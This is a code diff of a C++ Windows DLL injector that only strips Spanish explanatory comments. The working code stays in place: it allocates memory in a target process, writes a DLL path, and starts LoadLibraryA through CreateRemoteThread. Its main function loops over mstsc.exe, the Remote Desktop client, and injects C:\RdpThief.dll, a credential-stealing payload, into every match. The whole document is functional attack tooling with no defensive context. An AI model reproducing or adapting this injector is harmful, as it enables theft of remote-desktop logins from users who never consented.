@@ -32,7 +32,6 @@ BOOL InjectDLL(const DWORD& processId, const char* dllPath) {
         return FALSE;
     }
 
-    // Reservar memoria en el proceso de destino para la ruta de la DLL
     LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
     if (pDllPath == NULL) {
         std::cout << "Failed to allocate memory in target process." << std::endl;
@@ -40,7 +39,6 @@ BOOL InjectDLL(const DWORD& processId, const char* dllPath) {
         return FALSE;
     }
 
-    // Escribir la ruta de la DLL en la memoria reservada
     if (!WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, NULL)) {
         std::cout << "Failed to write DLL path to target process memory." << std::endl;
         VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
@@ -48,7 +46,6 @@ BOOL InjectDLL(const DWORD& processId, const char* dllPath) {
         return FALSE;
     }
 
-    // Obtener la dirección de LoadLibraryA
     LPVOID pLoadLibraryA = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
     if (pLoadLibraryA == NULL) {
         std::cout << "Failed to locate LoadLibraryA." << std::endl;
@@ -57,7 +54,6 @@ BOOL InjectDLL(const DWORD& processId, const char* dllPath) {
         return FALSE;
     }
 
-    // Crear un hilo remoto que ejecute LoadLibraryA con la ruta de la DLL como argumento
     HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pDllPath, 0, NULL);
     if (hThread == NULL) {
         std::cout << "Failed to create remote thread in target process." << std::endl;
@@ -66,10 +62,8 @@ BOOL InjectDLL(const DWORD& processId, const char* dllPath) {
         return FALSE;
     }
 
-    // Esperar a que el hilo termine
     WaitForSingleObject(hThread, INFINITE);
 
-    // Limpiar
     CloseHandle(hThread);
     VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
     CloseHandle(hProcess);
@@ -78,8 +72,8 @@ BOOL InjectDLL(const DWORD& processId, const char* dllPath) {
 }
 
 int main() {
-    const char* dllPath = "C:\\RdpThief.dll"; // Asegúrate de cambiar esto por la ruta de tu DLL
-    const std::string targetProcess = "mstsc.exe"; // Cambia esto por el nombre de tu proceso objetivo
+    const char* dllPath = "C:\\RdpThief.dll"; 
+    const std::string targetProcess = "mstsc.exe";
 
     while (true) {
         std::vector<DWORD> pids = FindProcessIds(targetProcess);
